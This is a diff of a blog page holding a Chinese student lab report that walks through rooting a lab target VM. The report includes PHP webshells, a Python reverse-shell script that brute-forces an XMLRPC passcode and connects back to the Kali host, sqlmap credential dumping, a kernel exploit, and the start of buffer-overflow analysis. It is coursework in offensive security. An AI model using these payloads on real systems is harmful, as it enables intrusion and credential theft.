@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.7.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://blog.kekwy.com/archives/2022/08/"/>
+  
+  <link rel="canonical" href="http://blog.kekwy.com/lab6-report/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,17 +33,19 @@
   <!-- feed -->
       <link rel="alternate" href="/atom.xml" title="铃的杂货铺" type="application/atom+xml">
   <!-- 页面元数据 -->
-  <title>归档：2022/8 - 铃的杂货铺</title>
+  <title>铃的杂货铺</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="喜欢夏天的无名之辈 - 可弟WZ铃号机 - 铃的杂货铺">
   
-<meta property="og:type" content="website">
+<meta property="og:type" content="article">
 <meta property="og:title" content="铃的杂货铺">
-<meta property="og:url" content="http://blog.kekwy.com/archives/2022/08/index.html">
+<meta property="og:url" content="http://blog.kekwy.com/lab6-report/index.html">
 <meta property="og:site_name" content="铃的杂货铺">
-<meta property="og:description" content="喜欢夏天的无名之辈">
+<meta property="og:description" content="网络攻防实战 实验报告 第六次实验 201220214 张宇轩 2020级 计算机科学与技术系 邮箱：&amp;#x6b;&amp;#x65;&amp;#x65;&amp;#x6b;&amp;#x6b;&amp;#x65;&amp;#119;&amp;#x79;&amp;#x40;&amp;#x71;&amp;#113;&amp;#46;&amp;#99;&amp;#111;&amp;#x6d; 2022年10月29日  目录[TOC] 一、实验目的取得目标靶机的root权限。 我们将使用到以下攻击手段：  主机发">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://blog.kekwy.com/media/images/logo.png">
+<meta property="article:published_time" content="2022-10-31T02:08:49.171Z">
+<meta property="article:modified_time" content="2022-10-31T02:07:00.322Z">
 <meta property="article:author" content="可弟WZ铃号机">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://blog.kekwy.com/media/images/logo.png">
@@ -2221,7 +2223,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin begin-->
     
     <!-- Custom Files bodyBegin end-->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2606,7 +2608,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper  search' style="display: ;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="/media/images/background.png"></div>
 
@@ -2698,24 +2700,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://blog.kekwy.com/javaNotes-3/">
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://blog.kekwy.com/lab6-report/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="铃的杂货铺">
   </span>
@@ -2724,169 +2710,519 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="喜欢夏天的无名之辈">
   </span>
   
+
+
+  
+    <span hidden>
+      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+    </span>
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <span hidden itemprop="name headline">
+        
+      </span>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h1 id="网络攻防实战-实验报告"><a href="#网络攻防实战-实验报告" class="headerlink" title="网络攻防实战 实验报告"></a>网络攻防实战 实验报告</h1><blockquote>
+<p>第六次实验</p>
+<p>201220214 张宇轩</p>
+<p>2020级 计算机科学与技术系</p>
+<p>邮箱：<a href="mailto:&#x6b;&#x65;&#x65;&#x6b;&#x6b;&#x65;&#119;&#x79;&#x40;&#x71;&#113;&#46;&#99;&#111;&#x6d;">&#x6b;&#x65;&#x65;&#x6b;&#x6b;&#x65;&#119;&#x79;&#x40;&#x71;&#113;&#46;&#99;&#111;&#x6d;</a></p>
+<p>2022年10月29日</p>
+</blockquote>
+<div class="story post-story"><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p>
+</div><div class="story post-story"><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>取得目标靶机的root权限。</p>
+<p>我们将使用到以下攻击手段：</p>
+<ul>
+<li>主机发现、端口扫描</li>
+<li>文件上传漏洞</li>
+<li>一句话木马</li>
+<li>Linux 发行版漏洞本地提权</li>
+<li>使用 sqlmap 进行注入</li>
+<li>使用蚁剑生成虚拟终端</li>
+<li>利用 XMLRPC 客户端注入命令</li>
+<li>使用 gdb-peda 调试程序</li>
+<li>缓冲区溢出攻击</li>
+</ul>
+<p style="page-break-after: always"></p>
+
+
+</div><div class="story post-story"><h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
+<p>kali: 10.0.2.15</p>
+<p>靶机: 10.0.2.10</p>
+</blockquote>
+<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
+<li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221029135603870.png width=750 />
+</div>
+</li>
+<li><p>访问8000端口，返回不支持 GET 请求：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030123452141.png width=500 />
+</div>
+</li>
+<li><p>通过浏览器访问靶机80端口：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221029152323383.png width=550 />
+</div>
+
+<p>注册之后进入下一级页面：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221029160654149.png width=650 />
+</div></li>
+</ol>
+<p><strong>以下将尝试使用两种方式进行提权：</strong></p>
+<ul>
+<li><p><a href="#fork1">Fork1 线路一</a></p>
+</li>
+<li><p><a href="#fork2">Fork2 线路二</a></p>
+</li>
+</ul>
+<h3 id="Fork1-线路一"><a href="#Fork1-线路一" class="headerlink" title="Fork1 线路一"></a>Fork1 线路一</h3><p><a id=fork1></a></p>
+<h4 id="0x01-文件上传漏洞"><a href="#0x01-文件上传漏洞" class="headerlink" title="0x01. 文件上传漏洞"></a>0x01. 文件上传漏洞</h4><ol>
+<li><p>发现当前页面可以发布 post 文章且可以附加图片，尝试在此上传一句话木马文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$var</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="keyword">echo</span> <span class="variable">$var</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221029173456644.png width=650 />
+</div>
+
+<p>上传成功：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221029173854563.png width=650 />
+</div>
+</li>
+<li><p>右击“图片”选择在新标签页打开，即可获取上传成功后的一句话木马文件的 url ，并尝试执行：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221029181239296.png width=700 />
+</div>
+</li>
+<li><p>执行成功，也得知靶机上存在 python 环境，尝试使用 python 版的反弹 shell 代码：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221029181608313.png width=700 />
+</div>
+
+<p>成功获取反弹 shell 并进行提升：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><a id="task1"></a></p>
+<h4 id="0x02-系统漏洞本地提权"><a href="#0x02-系统漏洞本地提权" class="headerlink" title="0x02. 系统漏洞本地提权"></a>0x02. 系统漏洞本地提权</h4><ol>
+<li><p>查看靶机的 Linux 发行版本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">lsb_release -a</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221029195719655.png width=420 />
+</div>
+</li>
+<li><p>搜索发现该版本的 Ubuntu 存在漏洞 <a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a> 并获取该漏洞的利用代码。将其下载在 kali 编译后通过 web 服务上传至靶机。在靶机上运行该代码实现提权。<a></a></p>
+<p>先使用如下指令进行编译：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -o exploit exploit.c</span></span><br></pre></td></tr></table></figure>
+
+<p>将编译生成的可执行文件上传至靶机，运行时发现报错 <code>./exploit: /lib/x86_64-linux-gnu/libc.so.6: version &#39;GLIBC_2.34&#39; not found (required by ./exploit)</code> 。虽然我们在 kali 上找到了该库文件，将其上传至靶机后，发现目标目录我们没有写入权限，即我们不能将该库文件移动到靶机的对应路径。</p>
+<p>尝试使用静态链接生成可执行文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -o exploit -static exploit.c</span></span><br></pre></td></tr></table></figure>
+
+<p>将新的可执行文件上传，发现成功获取 root 权限：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221029210946355.png width=550 />
+</div>
+
+<p>tips：运行时报错 <code>bash: ./exploit: Permission denied</code> ，使用如下指令给予运行权限即可：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 777 exploit</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="Fork2-路线二"><a href="#Fork2-路线二" class="headerlink" title="Fork2 路线二"></a>Fork2 路线二</h3><p><a id=fork2></a></p>
+<h4 id="0x01-sql-注入漏洞"><a href="#0x01-sql-注入漏洞" class="headerlink" title="0x01. sql 注入漏洞"></a>0x01. sql 注入漏洞</h4><ol>
+<li><p>在当前页面搜索框中输入单引号，发现存在 sql 注入漏洞：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221029161303927.png width=550 />
+</div>
+</li>
+<li><p>拦截针对搜索框输入内容的页面请求，并将其保存在一个文件（sqlinject）中：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221029161642135.png width=650 />
+</div>
+</li>
+<li><p>使用如下指令进行 sql 探测：</p>
+<p>（1）发现注入点：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sqlmap -r sqlinject -p query</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221029165036683.png width=650 />
+</div>
+
+<p>（2）查看当前用户可见的数据库：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sqlmap -r sqlinject -p query --dbs</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221029165333246.png width=450 />
+</div>
+
+<p>（3）查看数据库 <code>socialnetwork</code> 中的所有表：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sqlmap -r sqlinject -p query -D socialnetwork --tables</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221029165515547.png width=600 />
+</div>
+
+<p>（4）查看表 <code>users</code> 的列：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sqlmap -r sqlinject -p query -D socialnetwork -T <span class="built_in">users</span> --columns</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221029165713465.png width=700 />
+</div>
+
+<p>（5）查看表中 <code>user_email</code> 与 <code>user_password</code> 两项的内容：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sqlmap -r sqlinject -p query -D socialnetwork -T <span class="built_in">users</span> -C user_email,user_password --dump</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221029170537095.png width=650 />
+</div>
+
+<p>发现其他两个用户的 email 和密码。</p>
+</li>
+<li><p>但是分别使用两者登入网站，均没有获取有价值的信息。</p>
+</li>
+</ol>
+<h4 id="0x02-蚁剑接入靶机"><a href="#0x02-蚁剑接入靶机" class="headerlink" title="0x02. 蚁剑接入靶机"></a>0x02. 蚁剑接入靶机</h4><ol>
+<li><p>进入 Profile 页面，发现此处可以上传文件，尝试上传用于蚁剑接入的 php 脚本：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030110733218.png width=650 />
+</div>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221030110839321.png width=400 />
+</div>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发现主页多了一篇带有图片的 post，使用与上文中同样的方式获取上传完成的图片的 URL，这里是 <code>http://10.0.2.10/data/images/posts/10.php</code>。</p>
+<p style="page-break-after: always"></p>
+</li>
+<li><p>打开蚁剑右键空白区域，点击 add 添加数据：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030112123604.png width=700 />
+</div>
+</li>
+<li><p>输入我们脚本文件的 url，并根据脚本文件的内容填写 Shell pwd：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030113440817.png width=550 />
+</div>
+</li>
+<li><p>点击测试连接，右下角弹出“连接成功”：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030114014972.png width=800 />
+</div>
+</li>
+<li><p>点击左上角的 Add 完成添加。</p>
+</li>
+<li><p>右键我们新添加的 shell 记录，选择 Terminal：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030114255535.png width=800 />
+</div>
+
+<p>获取到一个靶机的虚拟终端：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030114404223.png width=800 />
+</div></li>
+</ol>
+<p>tips：</p>
+<ul>
+<li>蚁剑的安装方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/li963820454/article/details/123990766">https://blog.csdn.net/li963820454/article/details/123990766</a></li>
+</ul>
+<p><a id="task2"></a></p>
+<h4 id="0x03-XMLRPC-反弹-shell"><a href="#0x03-XMLRPC-反弹-shell" class="headerlink" title="0x03. XMLRPC 反弹 shell"></a>0x03. XMLRPC 反弹 shell</h4><ol>
+<li><p>查看有登录权限的用户：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd | grep /bin/bash</span></span><br></pre></td></tr></table></figure>
+
+<p>发现除了 root 用户之外，还存在一个 socnet 用户。</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030114732453.png width=800 />
+</div>
+</li>
+<li><p>进入至该用户的主目录，发现存在文件 <code>monitor.py</code>：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030114936083.png width=300 />
+</div>
+
+<p>查看内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runcmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mem</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disk</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">net</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line">    </span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>发现该代码会在8000端口上运行一个仅支持 XMPRPC 请求的服务器，联想之前我们访问靶机8000端口时返回不支持 GET 请求，推测该服务器已经处于运行状态。查看网站上用户 admin 发送的 post，可以进一步验证我们的猜想：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030132030283.png width=800 />
+</div>
+</li>
+<li><p>继续查看上述代码，发现该服务器上存在方法 <code>secure_cmd</code> 可以用于执行作为参数传入的命令，但是需要输入对应的密码，密码的范围是1000到9999（<code>debugging_pass = random.randint(1000,9999)</code>）。编写 XMPRPC 客户端，进行密码破解，并使服务器执行反弹 shell 代码（所有的双引号都需要转义），获取用户 socnet 身份的反弹 shell：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.10:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    <span class="keyword">for</span> passwd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">        <span class="built_in">print</span>(proxy.secure_cmd(<span class="string">&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.0.2.15\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;&quot;</span>, passwd))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在 kali 监听4444端口，然后运行我们编写的客户端代码，成功获取用户 socnet 身份的反弹 shell：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030145737703.png width=800 />
+</div></li>
+</ol>
+<p><a id="task3"></a></p>
+<h4 id="0x04-缓冲区溢出攻击"><a href="#0x04-缓冲区溢出攻击" class="headerlink" title="0x04. 缓冲区溢出攻击"></a>0x04. 缓冲区溢出攻击</h4><ol>
+<li><p>查看当前目录下的文件及其权限：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030153124089.png width=550 />
+</div>
+
+<ul>
+<li>文件 add_record 的所有者为 root 且当前用户组（socnet）具有 s 权限，尝试利用该文件提权；</li>
+<li>peda：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SmalOSnail/article/details/53149426?locationNum=1&amp;fps=1">https://blog.csdn.net/SmalOSnail/article/details/53149426?locationNum=1&amp;fps=1</a></li>
+</ul>
+</li>
+<li><p>查看 add_record 的文件类型：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file add_record</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221030153849739.png width=800 />
+</div>
+
+<p>发现是一个 ELF 文件。</p>
+</li>
+<li><p>尝试执行：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030155917806.png width=550 />
+</div>
+
+<p>共发现五个可以输入的地方（”Ever got in trouble? “这一项如果选0会直接结束程序）</p>
+</li>
+<li><p>联想到缓冲区溢出攻击，分别对每个输入的位置输入适当长的字符串寻找注入点。最终在输入 “Explain” 时触发了段错误（在其他位置的尝试最终都导致了程序的正常退出），说明可能存在缓冲区溢出攻击注入点。</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030162641422.png width=750 />
+</div>
+</li>
+<li><p>使用 <code>gdb</code> 对该程序进行调试：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb -q add_record</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221030171742371.png width=700 />
+</div>
+
+<p>查看其 main 函数汇编代码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disas main</span></span><br></pre></td></tr></table></figure>
+
+<p>简单阅读后，在一个接近注入点的位置打上断点（如果不确定可以在起始位置就打上断点），通过单步调试锁定注入点对应的汇编代码段。</p>
+<p>可以确定用户输入 “Explain” 时所调用的函数为位于 <code>0x08048822</code> 的 <code>gets</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   ...</span><br><span class="line">   0x08048822 &lt;+330&gt;:   call   0x8048490 &lt;gets@plt&gt;</span><br><span class="line">   0x08048827 &lt;+335&gt;:   add    esp,0x10</span><br><span class="line">   0x0804882a &lt;+338&gt;:   sub    esp,0xc</span><br><span class="line">   0x0804882d &lt;+341&gt;:   lea    eax,[ebp-0xac]</span><br><span class="line">   0x08048833 &lt;+347&gt;:   push   eax</span><br><span class="line">   0x08048834 &lt;+348&gt;:   call   0x80486ad &lt;vuln&gt;</span><br><span class="line">   ...</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>继续往下看，发现该函数返回后，所读取的字符串在内存中的首地址为 <code>0xffffdc6c</code> ：</p>
+<div align=left>
+    <img src=lab6-report.assets/image-20221030195947125.png width=800 />
+</div>
+
+<p>继续调试，发现调用函数 <code>vuln</code> 时发生缓冲区溢出。</p>
+</li>
+<li><p>查看函数 <code>vuln</code> 的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function vuln:</span><br><span class="line">   0x080486ad &lt;+0&gt;:     push   ebp</span><br><span class="line">   ...</span><br><span class="line">   0x080486c4 &lt;+23&gt;:    lea    edx,[ebp-0x3a]</span><br><span class="line">   0x080486c7 &lt;+26&gt;:    push   edx</span><br><span class="line">   0x080486c8 &lt;+27&gt;:    mov    ebx,eax</span><br><span class="line">   0x080486ca &lt;+29&gt;:    call   0x80484d0 &lt;strcpy@plt&gt;</span><br><span class="line">   ...</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>发现调用了函数 <code>strcpy</code>，将 <code>eax</code> 中地址指向的字符串拷贝到了 <code>ebx</code> 中地址指向的空间。而 <code>ebx</code> 中的值为 <code>ebp - 0x3a</code>，即目标空间的首地址距当前函数栈顶0x3a（58）字节。故当我们输入的字符串的长度大于58时，从第59个字符开始，就会覆盖栈中已有的数据。进行字符串拷贝时，当前函数栈顶之上的部分栈空间结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|             |</span><br><span class="line">+-------------+</span><br><span class="line">|   old_eip   |</span><br><span class="line">+-------------+ </span><br><span class="line">|   old_ebp   |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们输入的第63、64、65、66个字符恰好覆盖了当前函数的返回地址。真正找到了注入点！</p>
+<p style="page-break-after: always"></p>
+</li>
+<li><p>查看有关函数的信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">info func</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+    <img src=lab6-report.assets/image-20221030232757439.png width=350 />
+</div>
+
+<p>发现一个名字看起来就非常可疑的函数，查看其汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function backdoor:</span><br><span class="line">   0x08048676 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x08048677 &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x08048679 &lt;+3&gt;:     push   ebx</span><br><span class="line">   0x0804867a &lt;+4&gt;:     sub    esp,0x4</span><br><span class="line">   0x0804867d &lt;+7&gt;:     call   0x80485b0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x08048682 &lt;+12&gt;:    add    ebx,0x16c6</span><br><span class="line">   0x08048688 &lt;+18&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804868b &lt;+21&gt;:    push   0x0</span><br><span class="line">   0x0804868d 